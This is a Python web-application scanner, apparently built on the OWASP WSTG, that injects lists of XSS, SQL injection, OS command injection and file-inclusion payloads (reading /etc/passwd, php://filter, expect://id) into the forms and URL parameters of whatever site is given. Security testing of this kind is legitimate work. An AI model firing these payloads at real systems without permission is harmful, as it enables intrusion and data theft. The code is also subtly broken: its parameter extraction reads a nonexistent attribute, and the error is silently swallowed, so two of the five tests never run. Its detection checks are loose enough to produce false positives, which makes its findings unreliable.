#!/usr/bin/env python3
"""
OWASP WSTG Input Validation Testing Framework
WSTG-INPV-001 through WSTG-INPV-024
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'core'))

from base_tester import BaseTester
from utils import generate_report, save_findings, analyze_vulnerability
import requests
import json
import time
from urllib.parse import urljoin, urlparse, quote
import re

class InputValidationTester(BaseTester):
    """Input Validation Security Testing"""

    def __init__(self, target_url):
        super().__init__()
        self.target_url = target_url
        self.session = requests.Session()
        self.findings = []
        self.test_results = {}

    def test_for_reflected_xss(self):
        """WSTG-INPV-002 - Test for Reflected XSS"""
        print("[*] Testing for Reflected Cross Site Scripting...")

        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<body onload=alert("XSS")>',
            "';alert(String.fromCharCode(88,83,83))//",
            '"><script>alert(/XSS/)</script>',
            '<script>alert(document.domain)</script>',
            '<svg><script>alert(1)</script></svg>'
        ]

        vulnerabilities = []

        try:
            response = self.session.get(self.target_url)
            forms = self._extract_forms(response)

            for form in forms:
                for payload in xss_payloads:
                    try:
                        data = self._prepare_form_data(form, payload)
                        if form['method'].upper() == 'POST':
                            test_response = self.session.post(form['action'], data=data)
                        else:
                            test_response = self.session.get(form['action'], params=data)

                        if self._check_xss_in_response(test_response, payload):
                            vulnerability = {
                                'type': 'Reflected XSS',
                                'form': form['action'],
                                'method': form['method'],
                                'payload': payload,
                                'proof': 'XSS payload reflected in response',
                                'risk_level': 'High'
                            }
                            vulnerabilities.append(vulnerability)
                    except Exception as e:
                        continue

            findings = {
                'test_id': 'WSTG-INPV-002',
                'test_name': 'Reflected Cross Site Scripting Testing',
                'description': 'Testing for reflected XSS vulnerabilities in form inputs',
                'vulnerabilities': vulnerabilities,
                'vulnerability_count': len(vulnerabilities),
                'risk_level': 'High' if vulnerabilities else 'Low',
                'recommendations': [
                    'Implement input validation and output encoding',
                    'Use Content Security Policy (CSP)',
                    'Apply context-specific output encoding (HTML, JavaScript, CSS, URL)'
                ]
            }

            self.findings.append(findings)
            return findings

        except Exception as e:
            print(f"[*] Error testing reflected XSS: {e}")
            return None

    def test_for_sql_injection(self):
        """WSTG-INPV-005 - Test for SQL Injection"""
        print("[*] Testing for SQL Injection...")

        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
            "' OR 1=1#",
            "admin'--"
        ]

        vulnerabilities = []

        try:
            response = self.session.get(self.target_url)
            forms = self._extract_forms(response)

            for form in forms:
                for payload in sql_payloads:
                    try:
                        data = self._prepare_form_data(form, payload)
                        start_time = time.time()

                        if form['method'].upper() == 'POST':
                            test_response = self.session.post(form['action'], data=data, timeout=10)
                        else:
                            test_response = self.session.get(form['action'], params=data, timeout=10)

                        response_time = time.time() - start_time

                        if self._check_sql_in_response(test_response) or response_time > 4:
                            vulnerability = {
                                'type': 'SQL Injection',
                                'form': form['action'],
                                'method': form['method'],
                                'payload': payload,
                                'proof': 'SQL syntax error or time-based delay detected',
                                'response_time': response_time,
                                'risk_level': 'Critical'
                            }
                            vulnerabilities.append(vulnerability)
                    except Exception as e:
                        continue

            findings = {
                'test_id': 'WSTG-INPV-005',
                'test_name': 'SQL Injection Testing',
                'description': 'Testing for SQL injection vulnerabilities',
                'vulnerabilities': vulnerabilities,
                'vulnerability_count': len(vulnerabilities),
                'risk_level': 'Critical' if vulnerabilities else 'Low',
                'recommendations': [
                    'Use parameterized queries (prepared statements)',
                    'Implement ORM frameworks',
                    'Apply principle of least privilege to database accounts',
                    'Implement input validation and sanitization'
                ]
            }

            self.findings.append(findings)
            return findings

        except Exception as e:
            print(f"[*] Error testing SQL injection: {e}")
            return None

    def test_for_command_injection(self):
        """WSTG-INPV-012 - Test for Command Injection"""
        print("[*] Testing for Command Injection...")

        command_payloads = [
            '; ls -la',
            '| whoami',
            '&& cat /etc/passwd',
            '|| dir',
            '; ping -c 5 127.0.0.1',
            '& dir',
            '|cat /etc/hosts',
            '; sleep 5',
            '`whoami`',
            '$(whoami)'
        ]

        vulnerabilities = []

        try:
            response = self.session.get(self.target_url)
            forms = self._extract_forms(response)

            for form in forms:
                for payload in command_payloads:
                    try:
                        data = self._prepare_form_data(form, payload)
                        start_time = time.time()

                        if form['method'].upper() == 'POST':
                            test_response = self.session.post(form['action'], data=data, timeout=15)
                        else:
                            test_response = self.session.get(form['action'], params=data, timeout=15)

                        response_time = time.time() - start_time

                        if self._check_command_in_response(test_response) or response_time > 10:
                            vulnerability = {
                                'type': 'Command Injection',
                                'form': form['action'],
                                'method': form['method'],
                                'payload': payload,
                                'proof': 'Command output detected or significant delay',
                                'response_time': response_time,
                                'risk_level': 'Critical'
                            }
                            vulnerabilities.append(vulnerability)
                    except Exception as e:
                        continue

            findings = {
                'test_id': 'WSTG-INPV-012',
                'test_name': 'Command Injection Testing',
                'description': 'Testing for OS command injection vulnerabilities',
                'vulnerabilities': vulnerabilities,
                'vulnerability_count': len(vulnerabilities),
                'risk_level': 'Critical' if vulnerabilities else 'Low',
                'recommendations': [
                    'Avoid using system commands with user input',
                    'Use API functions instead of shell commands',
                    'Implement strict input validation',
                    'Use parameterized execution for system commands',
                    'Apply least privilege principle'
                ]
            }

            self.findings.append(findings)
            return findings

        except Exception as e:
            print(f"[*] Error testing command injection: {e}")
            return None

    def test_for_file_inclusion(self):
        """WSTG-INPV-017 - Test for File Inclusion"""
        print("[*] Testing for File Inclusion...")

        file_payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'file:///etc/passwd',
            'http://example.com/test',
            'ftp://example.com/test',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'data://text/plain;base64,SSBhbSBhIHZ1bG5lcmFiaWxpdHk=',
            'expect://id',
            'zip://test.zip#test.txt',
            'phar://test.phar/test.txt'
        ]

        vulnerabilities = []

        try:
            response = self.session.get(self.target_url)

            # Test URL parameters
            params = self._extract_url_parameters(response)
            for param in params:
                for payload in file_payloads:
                    try:
                        test_url = self._modify_url_parameter(self.target_url, param, payload)
                        test_response = self.session.get(test_url)

                        if self._check_file_in_response(test_response):
                            vulnerability = {
                                'type': 'File Inclusion',
                                'parameter': param,
                                'payload': payload,
                                'proof': 'File content or inclusion pattern detected',
                                'risk_level': 'Critical'
                            }
                            vulnerabilities.append(vulnerability)
                    except Exception as e:
                        continue

            findings = {
                'test_id': 'WSTG-INPV-017',
                'test_name': 'File Inclusion Testing',
                'description': 'Testing for local and remote file inclusion vulnerabilities',
                'vulnerabilities': vulnerabilities,
                'vulnerability_count': len(vulnerabilities),
                'risk_level': 'Critical' if vulnerabilities else 'Low',
                'recommendations': [
                    'Avoid dynamic file inclusion based on user input',
                    'Use whitelisting for allowed files',
                    'Implement proper access controls',
                    'Use absolute paths instead of relative paths',
                    'Apply file system permissions'
                ]
            }

            self.findings.append(findings)
            return findings

        except Exception as e:
            print(f"[*] Error testing file inclusion: {e}")
            return None

    def test_for_http_parameter_pollution(self):
        """WSTG-INPV-022 - Test for HTTP Parameter Pollution"""
        print("[*] Testing for HTTP Parameter Pollution...")

        try:
            response = self.session.get(self.target_url)
            params = self._extract_url_parameters(response)

            vulnerabilities = []

            for param in params[:5]:  # Test first 5 parameters
                # Submit multiple values for same parameter
                test_url_1 = f"{self.target_url}?{param}=value1&{param}=value2"
                test_url_2 = f"{self.target_url}?{param}=value1&{param}=value2&{param}=value3"

                try:
                    response_1 = self.session.get(test_url_1)
                    response_2 = self.session.get(test_url_2)

                    # Check if application behaves differently with multiple parameters
                    if response_1.status_code != response_2.status_code:
                        vulnerability = {
                            'type': 'HTTP Parameter Pollution',
                            'parameter': param,
                            'description': 'Different responses with multiple parameter values',
                            'proof': f'Status codes: {response_1.status_code} vs {response_2.status_code}',
                            'risk_level': 'Medium'
                        }
                        vulnerabilities.append(vulnerability)

                except Exception as e:
                    continue

            findings = {
                'test_id': 'WSTG-INPV-022',
                'test_name': 'HTTP Parameter Pollution Testing',
                'description': 'Testing for HTTP parameter pollution vulnerabilities',
                'vulnerabilities': vulnerabilities,
                'vulnerability_count': len(vulnerabilities),
                'risk_level': 'Medium' if vulnerabilities else 'Low',
                'recommendations': [
                    'Implement consistent parameter handling',
                    'Use parameter validation and sanitization',
                    'Consider using arrays for multiple values',
                    'Implement strict input validation'
                ]
            }

            self.findings.append(findings)
            return findings

        except Exception as e:
            print(f"[*] Error testing HTTP parameter pollution: {e}")
            return None

    def run_comprehensive_test(self):
        """Run all input validation tests"""
        print("=" * 60)
        print("OWASP WSTG INPUT VALIDATION TESTING")
        print("=" * 60)

        tests = [
            self.test_for_reflected_xss,
            self.test_for_sql_injection,
            self.test_for_command_injection,
            self.test_for_file_inclusion,
            self.test_for_http_parameter_pollution
        ]

        results = []
        for test in tests:
            try:
                result = test()
                if result:
                    results.append(result)
                print()
            except Exception as e:
                print(f"[*] Error in {test.__name__}: {e}")

        return results

    def _extract_forms(self, response):
        """Extract forms from HTML response"""
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = []

        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(self.target_url, form.get('action', '')),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }

            for input_field in form.find_all('input'):
                input_data = {
                    'name': input_field.get('name', ''),
                    'type': input_field.get('type', 'text'),
                    'value': input_field.get('value', '')
                }
                form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms

    def _prepare_form_data(self, form, payload):
        """Prepare form data for testing"""
        data = {}
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'password', 'search', 'email', 'hidden']:
                data[input_field['name']] = payload
            else:
                data[input_field['name']] = input_field['value']
        return data

    def _check_xss_in_response(self, response, payload):
        """Check if XSS payload is reflected in response"""
        # Look for our payload in the response
        if payload in response.text:
            return True

        # Look for common XSS patterns
        xss_patterns = [
            '<script>alert',
            '<img src=x onerror',
            '<svg/onload=alert',
            'onerror=alert',
            'javascript:alert',
            'String.fromCharCode'
        ]

        for pattern in xss_patterns:
            if pattern.lower() in response.text.lower():
                return True

        return False

    def _check_sql_in_response(self, response):
        """Check for SQL injection indicators in response"""
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'odbc drivers',
            'ora-01756',
            'microsoft ole db',
            'postgresql query failed',
            'sqlite3.operationalerror',
            'unterminated string',
            'warning: mysql',
            'fatal error',
            'you have an error in your sql syntax'
        ]

        response_lower = response.text.lower()
        for error in sql_errors:
            if error in response_lower:
                return True

        return False

    def _check_command_in_response(self, response):
        """Check for command injection indicators in response"""
        command_indicators = [
            'uid=',
            'gid=',
            'drwxr-xr-x',
            'volume in drive',
            'directory of',
            'total',
            'owned by',
            'error 5',
            'permission denied'
        ]

        response_lower = response.text.lower()
        for indicator in command_indicators:
            if indicator in response_lower:
                return True

        return False

    def _check_file_in_response(self, response):
        """Check for file inclusion indicators in response"""
        file_indicators = [
            'root:x:',
            'daemon:x:',
            'bin:x:',
            'sys:x:',
            '# localhost',
            'software\\microsoft\\windows',
            '[boot loader]',
            '[operating systems]'
        ]

        response_lower = response.text.lower()
        for indicator in file_indicators:
            if indicator in response_lower:
                return True

        # Check for actual file content patterns
        if len(response.text) > 100 and not response.headers.get('content-type', '').startswith('text/html'):
            return True

        return False

    def _extract_url_parameters(self, response):
        """Extract URL parameters from the current URL"""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(response.url)
        params = parse_qs(parsed.url.split('?')[-1] if '?' in parsed.url else '')
        return list(params.keys())

    def _modify_url_parameter(self, url, param, value):
        """Modify URL parameter with test value"""
        from urllib.parse import urlencode, urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = value
        query = urlencode(params, doseq=True)
        return parsed._replace(query=query).geturl()

def main():
    if len(sys.argv) < 2:
        print("Usage: python input_validation_tester.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]

    try:
        tester = InputValidationTester(target_url)
        results = tester.run_comprehensive_test()

        if results:
            # Generate report
            report = generate_report(
                target_url=target_url,
                test_results=results,
                test_category='Input Validation',
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
            )

            # Save results
            save_findings(report, 'input_validation_test_results.json')

            print(f"\n[*] Test completed. Results saved to input_validation_test_results.json")
        else:
            print("[*] No tests completed successfully")

    except KeyboardInterrupt:
        print("\n[*] Test interrupted by user")
    except Exception as e:
        print(f"[*] Error: {e}")

if __name__ == "__main__":
    main()